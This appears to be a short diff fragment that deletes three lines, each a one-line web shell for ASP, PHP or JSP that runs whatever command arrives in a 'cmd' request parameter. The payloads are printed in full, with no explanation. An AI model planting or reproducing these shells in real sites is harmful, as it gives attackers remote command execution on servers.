@@ -1,3 +1,0 @@
-ASP <% eval request("cmd") %> 
-PHP <?php system($_GET["cmd"]) ?> 
-JSP <% Runtime.getruntime().exec(request.getParameter("cmd")) %>
